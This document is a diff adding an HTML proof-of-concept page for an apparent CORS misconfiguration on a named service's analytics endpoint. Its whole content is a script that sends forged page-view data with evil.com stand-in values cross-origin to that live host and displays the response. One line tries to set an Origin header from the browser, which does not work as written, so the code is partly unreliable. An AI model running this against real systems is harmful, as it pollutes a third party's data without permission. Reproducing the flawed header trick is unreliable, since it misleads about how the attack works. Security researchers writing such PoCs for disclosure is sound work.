@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <h1>PoC – Snowbridge Analytics CORS Misconfiguration</h1>
+    <script>
+      fetch("https://app.snowbridge.network/_vercel/insights/view", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          "Origin": "https://evil.com"
+        },
+        body: JSON.stringify({
+          o: "https://evil.com/poc",
+          sv: "9.9.9",
+          ts: Date.now(),
+          r: "https://evil.com/malicious"
+        })
+      })
+      .then(res => res.text())
+      .then(data => {
+        document.body.innerHTML += "<p>Server responded: " + data + "</p>";
+      })
+      .catch(err => console.error("❌ Error:", err));
+    </script>
+  </body>
+</html>
